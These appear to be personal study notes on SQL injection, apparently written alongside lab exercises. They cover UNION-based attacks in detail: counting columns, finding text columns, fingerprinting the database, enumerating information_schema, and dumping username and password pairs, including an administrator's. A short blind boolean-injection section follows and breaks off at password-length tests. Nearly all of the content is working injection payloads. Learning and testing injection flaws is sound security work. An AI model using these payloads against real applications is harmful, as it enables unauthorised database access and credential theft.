# Union attacks : 
General query : `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

How to determine the number of columns required ?
we use order by statment : 

	' order by 1 --, 
	' order by 2 --, 
	' order by 3 --, ...etc

untill getting an error.

or
	' UNION SELECT NULL--
	' UNION SELECT NULL,NULL--
	' UNION SELECT NULL,NULL,NULL--, -etc.

for oracle, specific syntax `' UNION SELECT NULL FROM DUAL--`

Finding columns with a useful data type
we use the followinf payload when we know the number of columns : 

	' UNION SELECT 'a',NULL,NULL,NULL--
	' UNION SELECT NULL,'a',NULL,NULL--
	' UNION SELECT NULL,NULL,'a',NULL--
	' UNION SELECT NULL,NULL,NULL,'a'--

or 

	- UNION SELECT 1,2,3,4-- 

to retreive data, we can use  

	' UNION SELECT username, password FROM users--

another example when columns are not even 

	SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
	UNION SELECT username, 2, 3, 4 from passwords-- '


Retreiving multiple values within the same column we can use contact depending on the sql syntax

	' UNION SELECT username || '~' || password FROM users--

we can query information about the sql such as : 

	' UNION Database type	Query
	' UNION Microsoft, MySQL	SELECT @@version
	' UNION Oracle	SELECT * FROM v$version
	' UNION PostgreSQL	SELECT version()

Listing the contents of the database
Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
example : 

	SELECT * FROM information_schema.tables
	SELECT * FROM information_schema.columns WHERE table_name = 'Users'
	SELECT * FROM my_database.users;
	

Notes : First we have to know the database name  database 	

	SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;  // to enumrate databases;

then see the tables within the db

	select TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - 
	
	// !!!!! reminder number of columns don't make the mistake!!!!!!

the dump the columns 

	select COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='users_xemvgh'

and then Get the data you need : 

	select username_ecephv,password_akjxku from users_xemvgh where username_ecephv = 'administrator' --

# Blind SQL Injection :
blind sql injection, is when we have an injection without the visual output, the vuln occurs at the backend 

we start wy trigerring a false boolean logic and see if there is any change the page for example :

	…xyz' AND '1'='1 // here wothing will change
	…xyz' AND '1'='2 // here normaly we won't see welcome back for example.

first we start by knowing the length of the password for example : 

	TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
	
	xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a